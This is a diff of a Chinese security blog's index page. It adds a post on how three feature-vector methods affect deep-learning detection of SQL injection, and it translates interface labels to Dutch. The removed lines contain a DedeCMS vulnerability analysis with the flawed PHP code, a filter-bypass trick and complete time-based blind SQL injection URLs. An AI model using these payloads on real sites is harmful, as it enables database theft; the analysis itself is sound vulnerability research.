@@ -53,7 +53,7 @@
         
           <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Zoeken"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
@@ -63,6 +63,115 @@
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-三种特征向量对深度学习攻击检测的影响" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/08/08/三种特征向量对深度学习攻击检测的影响/" class="article-date">
+  <time datetime="2017-08-08T10:35:49.000Z" itemprop="datePublished">2017-08-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/08/08/三种特征向量对深度学习攻击检测的影响/">三种特征向量对深度学习攻击检测的影响</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-文章介绍"><a href="#0x00-文章介绍" class="headerlink" title="0x00 文章介绍"></a>0x00 文章介绍</h2><p>深度学习与网络安全结合是未来网络安全的一个大趋势，我们今天以基于深度学习的主流算法对SQL注入行为进行检测，来抛出三种特征向量对深度学习模型检测效果的影响。</p>
+<h2 id="0x01-深度学习简介"><a href="#0x01-深度学习简介" class="headerlink" title="0x01 深度学习简介"></a>0x01 深度学习简介</h2><p>深度学习（Deep Learning）是机器学习的分支，它试图使用包含复杂结构或由多重非线性变换构成的多个处理层对数据进行高层抽象的算法。</p>
+<p>深度学习是机器学习中一种基于对数据进行表征学习的方法。深度学习的好处是用非监督式或半监督式的特征学习和分层特征提取高效算法来替代手工获取特征。</p>
+<p>在我们的实验中，使用的是Python深度学习库： <strong>TensorFlow</strong>。</p>
+<p><strong>使用的模型是：</strong></p>
+<ul>
+<li><p><strong>多层感知器</strong></p>
+<p>  多层感知器（Multilayer Perceptron,缩写MLP）是一种前向结构的人工神经网络，映射一组输入向量到一组输出向量。MLP可以被看作是一个有向图，由多个的节点层所组成，每一层都全连接到下一层。除了输入节点，每个节点都是一个带有非线性激活函数的神经元（或称处理单元）。<a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E5%B1%82%E6%84%9F%E7%9F%A5%E5%99%A8" target="_blank" rel="external">详细介绍</a></p>
+</li>
+<li><p><strong>卷积神经网络</strong></p>
+<p>  卷积神经网络（Convolutional Neural Network, CNN）是一种前馈神经网络，它的人工神经元可以响应一部分覆盖范围内的周围单元，对于大型图像处理有出色表现。卷积神经网络由一个或多个卷积层和顶端的全连通层（对应经典的神经网络）组成，同时也包括关联权重和池化层（pooling layer）。这一结构使得卷积神经网络能够利用输入数据的二维结构。与其他深度学习结构相比，卷积神经网络在图像和语音识别方面能够给出更优的结果。这一模型也可以使用反向传播算法进行训练。相比较其他深度、前馈神经网络，卷积神经网络需要估计的参数更少，使之成为一种颇具吸引力的深度学习结构。<a href="https://zh.wikipedia.org/wiki/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C" target="_blank" rel="external">详细介绍</a></p>
+</li>
+<li><p><strong>循环神经网络</strong></p>
+<p>  递归神经网络（RNN）是两种人工神经网络的总称。一种是时间递归神经网络（recurrent neural network），另一种是结构递归神经网络（recursive neural network）。时间递归神经网络的神经元间连接构成有向图，而结构递归神经网络利用相似的神经网络结构递归构造更为复杂的深度网络。RNN一般指代时间递归神经网络。单纯递归神经网络因为无法处理随着递归，权重指数级爆炸或消失的问题（Vanishing gradient problem），难以捕捉长期时间关联；而结合不同的LSTM可以很好解决这个问题。<a href="https://zh.wikipedia.org/wiki/%E9%80%92%E5%BD%92%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C" target="_blank" rel="external">详细介绍</a></p>
+</li>
+</ul>
+<h3 id="实验中使用的网络结构"><a href="#实验中使用的网络结构" class="headerlink" title="实验中使用的网络结构"></a>实验中使用的网络结构</h3><h4 id="多层感知器"><a href="#多层感知器" class="headerlink" title="多层感知器"></a>多层感知器</h4><p>神经网络结构为：</p>
+<ul>
+<li>输入层</li>
+<li>隐藏层 L1 </li>
+<li>隐藏层 L2</li>
+<li>隐藏层 L3</li>
+<li>输出层</li>
+</ul>
+<p>每个隐藏层使用128个神经元，激活函数为relu。</p>
+<p><img src="/2017/08/08/三种特征向量对深度学习攻击检测的影响/1.png"></p>
+<p>上图为 <strong>TensorBoard</strong> 输出的结构图。</p>
+<h4 id="卷积神经网络"><a href="#卷积神经网络" class="headerlink" title="卷积神经网络"></a>卷积神经网络</h4><p>神经网络结构为：</p>
+<ul>
+<li>输入层</li>
+<li>卷积层 </li>
+<li>池化层 </li>
+<li>卷积层 </li>
+<li>池化层 </li>
+<li>全连接层</li>
+<li>输出层</li>
+</ul>
+<h4 id="循环神经网络"><a href="#循环神经网络" class="headerlink" title="循环神经网络"></a>循环神经网络</h4><p>神经网络结构为：</p>
+<ul>
+<li>输入层</li>
+<li>向前层</li>
+<li>向后层</li>
+<li>输出层</li>
+</ul>
+<p><img src="/2017/08/08/三种特征向量对深度学习攻击检测的影响/5.png" width="50%"></p>
+<p><strong>PS：训练集和测试集来自于360企业安全-天眼大数据平台，模型纯度良好。</strong></p>
+<h2 id="0x02-特征向量介绍"><a href="#0x02-特征向量介绍" class="headerlink" title="0x02 特征向量介绍"></a>0x02 特征向量介绍</h2><p>我们的特征向量转化，使用了三种方法，也是目前应对字符串比较好的方法选择。</p>
+<ul>
+<li>基于word2vec的特征向量</li>
+<li>基于词袋的特征向量</li>
+<li>基于fofe的特征向量</li>
+</ul>
+<h4 id="基于word2vec的特征向量"><a href="#基于word2vec的特征向量" class="headerlink" title="基于word2vec的特征向量"></a>基于word2vec的特征向量</h4><p>word2vec可以根据模型把词汇转化成一个多维的特征向量，在构建语句的特征时，我们采用暴力的向量相加的方式。</p>
+<p>word2vec在自然语言的实验中，可以很好的表示词语见的关系。具体可以参考 <a href="http://www.52nlp.cn/tag/word2vec" target="_blank" rel="external">维基百科语料中的词语相似度探索</a></p>
+<h4 id="基于词袋的特征向量"><a href="#基于词袋的特征向量" class="headerlink" title="基于词袋的特征向量"></a>基于词袋的特征向量</h4><p>词袋向量，我们在天眼实验室的攻击平台上，挑选了在SQL注入中最常出现的250个词汇，构建词袋模型。</p>
+<p>词袋模型的参考 <a href="http://blog.csdn.net/u010213393/article/details/40987945" target="_blank" rel="external">BoW（词袋）模型详细介绍</a></p>
+<h4 id="基于FOFE的特征向量"><a href="#基于FOFE的特征向量" class="headerlink" title="基于FOFE的特征向量"></a>基于FOFE的特征向量</h4><p>FOFE是一种简单精妙的rule-base编码方式。通俗的说就是，在one-hot的基础上利用了数值的大小表明了词的位置信息的一种编码形式。我们基于上面词袋模型的基础，加入了FOFE算法。</p>
+<p>FOFE算法的具体论文，来自江辉老师。 <a href="https://www.aclweb.org/anthology/P/P15/P15-2081.pdf?spm=5176.100239.blogcont118686.20.PWd2AD&amp;file=P15-2081.pdf" target="_blank" rel="external">The Fixed-Size Ordinally-Forgetting Encoding Method<br>for Neural Network Language Models</a></p>
+<h2 id="0x03-实验结果分析"><a href="#0x03-实验结果分析" class="headerlink" title="0x03 实验结果分析"></a>0x03 实验结果分析</h2><p>我们的训练数据为50000条，测试数据为500000条。</p>
+<p><img src="/2017/08/08/三种特征向量对深度学习攻击检测的影响/2.png" width="80%"></p>
+<p>三种向量结果都表现了非常好的准确度。</p>
+<p><img src="/2017/08/08/三种特征向量对深度学习攻击检测的影响/3.png" width="90%"></p>
+<p>从上图可以看出，基于FOFE的特征向量和词袋特征向量的表现并没有出现特别明显的差距，位置元素的融入并没有给FOFE特征向量带来明显的检测水平的提升。word2vec的向量在真实集表现的不是很好，其中的原因是我们建立句子，使用的是向量相加的粗暴方法，并不能体现word2vec对句子的属性体现。</p>
+<p><img src="/2017/08/08/三种特征向量对深度学习攻击检测的影响/4.png" width="70%"></p>
+<p>从上图可以看出，基于word2vec的特征向量的判断速度明显慢于其他两种方法。基于词袋的速度比基于fofe的速度快一点，本质原因是fofe算法的引入，带来了一定的计算量，符合速度降低的预期。</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>笔者认为，本次我们利用三种建立向量的方式和三种神经网络结构进行交叉实验，探讨三种方式的向量形式和神经网络结构之间的关系，算是抛砖引玉。本次实验最为惊讶的是 CNN 和 word2vec的组合在真实集表现的最好。基于FOFE的特征向量具有顺序的概念，但是未能在词袋模型的基础上带来更好的检测结果。</p>
+<p>深度神经网络在安全检测方面，可以带领我们进入检测“未知的未知”的能力层次，这点也是我们必须要对此付出努力的方向。路要一步一步走，我们会在这个方向上继续前行。</p>
+<h2 id="0x05-参考引用"><a href="#0x05-参考引用" class="headerlink" title="0x05 参考引用"></a>0x05 参考引用</h2><ul>
+<li><a href="https://zh.wikipedia.org/wiki/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0" target="_blank" rel="external">https://zh.wikipedia.org/wiki/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0</a></li>
+<li><a href="https://yq.aliyun.com/articles/118686?spm=5176.100239.0.0.g2XnLx" target="_blank" rel="external">https://yq.aliyun.com/articles/118686?spm=5176.100239.0.0.g2XnLx</a></li>
+<li><a href="http://www.52nlp.cn/tag/word2vec" target="_blank" rel="external">http://www.52nlp.cn/tag/word2vec</a></li>
+<li><a href="http://blog.csdn.net/u010213393/article/details/40987945" target="_blank" rel="external">http://blog.csdn.net/u010213393/article/details/40987945</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/08/08/三种特征向量对深度学习攻击检测的影响/" data-id="cj63ggoxy0009htfys12u651i" class="article-share-link">Delen</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -162,7 +271,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/" data-id="cj4gby8pp0000nk02kzq93iyc" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/" data-id="cj63ggox10002htfyrynw1ibl" class="article-share-link">Delen</a>
       
       
     </footer>
@@ -232,7 +341,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/06/22/Rise-of-the-machines读后感/" data-id="cj4gby8q60004nk02exe8xklx" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/06/22/Rise-of-the-machines读后感/" data-id="cj63ggoxc0004htfyyedrvu69" class="article-share-link">Delen</a>
       
       
     </footer>
@@ -377,7 +486,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/06/13/Spring-Web-Flow-RCE漏洞分析/" data-id="cj4gby8q80005nk02puzzw8gw" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/06/13/Spring-Web-Flow-RCE漏洞分析/" data-id="cj63ggoxf0005htfytrmpskn4" class="article-share-link">Delen</a>
       
       
     </footer>
@@ -534,7 +643,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/05/05/WordPress-4-6版本远程代码执行漏洞/" data-id="cj4gby8r40008nk020i6syam1" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/05/05/WordPress-4-6版本远程代码执行漏洞/" data-id="cj63ggoxt0008htfymunr88dj" class="article-share-link">Delen</a>
       
       
     </footer>
@@ -685,7 +794,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/21/Struts2-S046命令执行漏洞/" data-id="cj4gby8r00006nk02xzevszee" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/03/21/Struts2-S046命令执行漏洞/" data-id="cj63ggoxo0007htfyra2xnohg" class="article-share-link">Delen</a>
       
       
     </footer>
@@ -813,7 +922,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/08/Struts2-Jakarta模块Content-type命令执行漏洞-CVE-2017-5638/" data-id="cj4gby8r10007nk027mijctcl" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/03/08/Struts2-Jakarta模块Content-type命令执行漏洞-CVE-2017-5638/" data-id="cj63ggoxj0006htfyx1l9cone" class="article-share-link">Delen</a>
       
       
     </footer>
@@ -898,7 +1007,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/05/05/ImageMagic初步分析/" data-id="cj4gby8pv0002nk02l3sovnvz" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/05/05/ImageMagic初步分析/" data-id="cj63ggowz0001htfyohtjxvhc" class="article-share-link">Delen</a>
       
       
     </footer>
@@ -1013,7 +1122,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/12/22/Java反序列化内容/" data-id="cj4gby8q00003nk02n6xohasq" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/12/22/Java反序列化内容/" data-id="cj63ggox70003htfy2dz61bis" class="article-share-link">Delen</a>
       
       
     </footer>
@@ -1267,156 +1376,7 @@ class vB5_Template {
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/" data-id="cj4gby8rb0009nk02qmagbzz6" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Dedecms-20150618-注入" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2015/08/14/Dedecms-20150618-注入/" class="article-date">
-  <time datetime="2015-08-14T07:24:57.000Z" itemprop="datePublished">2015-08-14</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/08/14/Dedecms-20150618-注入/">Dedecms 20150618 注入</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x00-漏洞信息"><a href="#0x00-漏洞信息" class="headerlink" title="0x00 漏洞信息"></a>0x00 漏洞信息</h2><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0127787" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2015-0127787</a></p>
-<h2 id="0x01-漏洞成因概述"><a href="#0x01-漏洞成因概述" class="headerlink" title="0x01 漏洞成因概述"></a>0x01 漏洞成因概述</h2><p>由于dedecms使用伪全局变量原因，可导致用户构造任意的sql语句，造成注入。</p>
-<p>漏洞利用流程：</p>
-<ul>
-<li>利用_FILE传递数组</li>
-<li>绕过dedecms的sql注入检测机制</li>
-<li>进行注入</li>
-</ul>
-<h2 id="0x02-漏洞细节"><a href="#0x02-漏洞细节" class="headerlink" title="0x02 漏洞细节"></a>0x02 漏洞细节</h2><h3 id="完整进行注入的语句为："><a href="#完整进行注入的语句为：" class="headerlink" title="完整进行注入的语句为："></a>完整进行注入的语句为：</h3><pre><code>http://192.168.110.135//dedefull/uploads/member/mtypes.php?
-dopost=save&amp;
-_FILES[mtypename][name]=.xxxx&amp;
-_FILES[mtypename][type]=xxxxx&amp;
-_FILES[mtypename][tmp_name][1&apos; and `&apos;`.``.mtypeid or if(now() like sysdate(),SLEEP(if(ORD(MID(( SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1 ),1,1)) like 54,5,0)),0)%23fuck]=1&amp;
-_FILES[mtypename][size]=.xxxx
-</code></pre><p>需要理解的四点：</p>
-<ol>
-<li>为什么用_FILE传数组</li>
-<li>为什么注入语句写在tmp_name后</li>
-<li>为什么注入语句中有`‘`.``.mtypeid</li>
-<li>如何绕过dede的防注入</li>
-</ol>
-<h3 id="变量传递过程"><a href="#变量传递过程" class="headerlink" title="变量传递过程"></a>变量传递过程</h3><p>mtypes.php文件是一个缺陷文件，只要通过把$mtypename构造成数组，并且在把数组的key定义为sql注入语句，那么便可逃逸全局GPC。</p>
-<pre><code>foreach ($mtypename as $id =&gt; $name)
-{
-    $name = HtmlReplace($name);
-    $query = &quot;UPDATE `#@__mtypes` SET mtypename=&apos;$name&apos; WHERE mtypeid=&apos;$id&apos; AND mid=&apos;$cfg_ml-&gt;M_ID&apos;&quot;;
-    $dsql-&gt;ExecuteNoneQuery($query);
-}
-</code></pre><p>该文件的最后部分为缺陷部分，$id 和 $name 都在查询语句中，但是全局过滤未对数组的key进行过滤，导致$id内可以带任何字符，接下来就是构造$id的事情了。</p>
-<p>由于dedecms是一个伪全局的cms，我们需要把$mtypename覆盖出来，那么为什么用_FILE传输组呢，整个cms在变量初始化的过程中，在uploadsafe.inc.php中，会预处理_FILE传入的值，但是这段代码有问题。</p>
-<pre><code>foreach($_FILES as $_key=&gt;$_value)
-{
-    foreach($keyarr as $k)
-    {
-        if(!isset($_FILES[$_key][$k]))
-        {
-            exit(&apos;Request Error!&apos;);
-        }
-    }
-if( preg_match(&apos;#^(cfg_|GLOBALS)#&apos;, $_key) )
-{
-    exit(&apos;Request var not allow for uploadsafe!&apos;);
-}
-$$_key = $_FILES[$_key][&apos;tmp_name&apos;];
-${$_key.&apos;_name&apos;} = $_FILES[$_key][&apos;name&apos;];
-${$_key.&apos;_type&apos;} = $_FILES[$_key][&apos;type&apos;] = preg_replace(&apos;#[^0-9a-z\./]#i&apos;, &apos;&apos;, $_FILES[$_key][&apos;type&apos;]);
-${$_key.&apos;_size&apos;} = $_FILES[$_key][&apos;size&apos;] = preg_replace(&apos;#[^0-9]#&apos;,&apos;&apos;,$_FILES[$_key][&apos;size&apos;]);
-</code></pre><p>可以在倒数第四行看到一处变量覆盖，取$_key作为key，$_FILES[$_key][‘tmp_name’]作为value。</p>
-<p>我们传入的内容</p>
-<p><img src="/2015/08/14/Dedecms-20150618-注入/3.png" alt=""></p>
-<p>覆盖后的内容</p>
-<p><img src="/2015/08/14/Dedecms-20150618-注入/4.png" alt=""></p>
-<p><strong>绕过dedecms防sql模块</strong></p>
-<p>dedecms防注入模块有个bug，只要在`‘`后面的语句，都不会过防sqli模块。</p>
-<p>为什么这么构造？首先，我们看下dedecms防注入模块的执行流程。</p>
-<p><img src="/2015/08/14/Dedecms-20150618-注入/5.png" alt=""></p>
-<p>在流程图中，最关键的步骤是生产clean sql的部分，其代码如下。</p>
-<pre><code>while (TRUE)
-    {
-        $pos = strpos($db_string, &apos;\&apos;&apos;, $pos + 1);
-        if ($pos === FALSE)
-        {
-            break;
-        }
-        $clean .= substr($db_string, $old_pos, $pos - $old_pos);
-        while (TRUE)
-        {
-            $pos1 = strpos($db_string, &apos;\&apos;&apos;, $pos + 1);
-            $pos2 = strpos($db_string, &apos;\\&apos;, $pos + 1);
-            if ($pos1 === FALSE)
-            {
-                break;
-            }
-            elseif ($pos2 == FALSE || $pos2 &gt; $pos1)
-            {
-                $pos = $pos1;
-                break;
-            }
-            $pos = $pos2 + 1;
-        }
-        $clean .= &apos;$s$&apos;;
-        $old_pos = $pos + 1;
-    }
-    $clean .= substr($db_string, $old_pos);
-    $clean = trim(strtolower(preg_replace(array(&apos;~\s+~s&apos; ), array(&apos; &apos;), $clean)));
-</code></pre><p>通过阅读以上代码可以发现，这段代码的主要逻辑是把两个单引号（’）中间的内容替换为$s$，其他语句拼接到clean sql中。pos为第一个单引号的位置，pos1为第二的单引号的位置，pos2为第一个消意号的位置，通过这三个位置，便可以确定单引号之间的内容。</p>
-<p>通过这个特性，绕过防注入模块的思路大致是这样：<strong>先构造一个无意义的单引号，再在注释后面构造一个单引号来闭合前面无意义的单引号。</strong></p>
-<p>翻看之前dedecms的注入发现，大致有如下几种绕过技巧。</p>
-<ul>
-<li>char(@`‘`)</li>
-<li>char(“‘“)</li>
-<li>@`‘`</li>
-</ul>
-<p>但是最新版本已经对如上方式进行了检测</p>
-<pre><code>if (strpos($clean, &apos;@&apos;) !== FALSE  OR strpos($clean,&apos;char(&apos;)!== FALSE OR strpos($clean,&apos;&quot;&apos;)!== FALSE OR strpos($clean,&apos;$s$$s$&apos;)!== FALSE)
-</code></pre><p>因此需要一种新型绕过方式，主要还是利用`‘`特性：</p>
-<p><img src="/2015/08/14/Dedecms-20150618-注入/2.png" alt=""></p>
-<p>但是有个要求，hitsid必须是testf.v959_hits表的字段，同理，利用此特性，构造查询语句。</p>
-<p>构造盲注查询语句：</p>
-<pre><code>1&apos; and `&apos;`.``.mtypeid or if(now() like sysdate(),SLEEP(if(ORD(MID(( SELECT count(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))like 50,5,0)),0)%23fuck
-</code></pre><p>此语句所查内容为：如果此mysql所含的数据库的个数的第一位为2（ascii码为50），则sleep 5秒。</p>
-<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>只要登陆了用户中心，便可以进行时间盲注，查询数据库内容。</p>
-<p><img src="/2015/08/14/Dedecms-20150618-注入/6.png" alt=""></p>
-<p>查mysql所含的数据库的个数</p>
-<p>个数的第一位为2</p>
-<pre><code>http://192.168.110.135//dedefull/uploads/member/mtypes.php?dopost=save&amp;_FILES[mtypename][name]=.xxxx&amp;_FILES[mtypename][type]=xxxxx&amp;_FILES[mtypename][tmp_name][1&apos; and `&apos;`.``.mtypeid or if(now() like sysdate(),SLEEP(if(ORD(MID(( SELECT count(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))like 50,5,0)),0)%23fuck]=1&amp;_FILES[mtypename][size]=.xxxx
-</code></pre><p>个数的第二位为3</p>
-<pre><code>http://192.168.110.135//dedefull/uploads/member/mtypes.php?dopost=save&amp;_FILES[mtypename][name]=.xxxx&amp;_FILES[mtypename][type]=xxxxx&amp;_FILES[mtypename][tmp_name][1&apos; and `&apos;`.``.mtypeid or if(now() like sysdate(),SLEEP(if(ORD(MID(( SELECT count(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))like 51,5,0)),0)%23fuck]=1&amp;_FILES[mtypename][size]=.xxxx
-</code></pre><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>该漏洞利用零散的dedecms的漏洞，对这些小问题加以组合，最终到达随意注射的程度，十分精彩。分析这个漏洞，收获是在漏洞分析时，要有全局的眼光，不要忽视之前出现的每一个问题。</p>
-<p>漏洞小结</p>
-<p>影响范围个人评价为“高”，危害性个人评价为“高”，dedecms在国内的使用范围非常广，此漏洞只要登录会员中心便可取数据。</p>
-<p>防护方案</p>
-<p>对数组传入的key和value均进行gpc过滤。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/08/14/Dedecms-20150618-注入/" data-id="cj4gby8pt0001nk02coyxmxov" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/" data-id="cj63ggoyk000ahtfyr9d2w9qq" class="article-share-link">Delen</a>
       
       
     </footer>
@@ -1427,6 +1387,10 @@ ${$_key.&apos;_size&apos;} = $_FILES[$_key][&apos;size&apos;] = preg_replace(&ap
 
   
 
+
+  <nav id="page-nav">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
+  </nav>
 </section>
         
           <aside id="sidebar">
@@ -1441,9 +1405,9 @@ ${$_key.&apos;_size&apos;} = $_FILES[$_key][&apos;size&apos;] = preg_replace(&ap
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
+    <h3 class="widget-title">Archieven</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
     </div>
   </div>
 
@@ -1451,9 +1415,13 @@ ${$_key.&apos;_size&apos;} = $_FILES[$_key][&apos;size&apos;] = preg_replace(&ap
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
+    <h3 class="widget-title">Recente berichten</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2017/08/08/三种特征向量对深度学习攻击检测的影响/">三种特征向量对深度学习攻击检测的影响</a>
+          </li>
         
           <li>
             <a href="/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/">Drupal Core CVE-2017-6920 远程代码执行漏洞分析</a>
@@ -1469,10 +1437,6 @@ ${$_key.&apos;_size&apos;} = $_FILES[$_key][&apos;size&apos;] = preg_replace(&ap
         
           <li>
             <a href="/2017/05/05/WordPress-4-6版本远程代码执行漏洞/">WordPress 4.6版本远程代码执行漏洞</a>
-          </li>
-        
-          <li>
-            <a href="/2017/03/21/Struts2-S046命令执行漏洞/">Struts2 S046命令执行漏洞</a>
           </li>
         
       </ul>
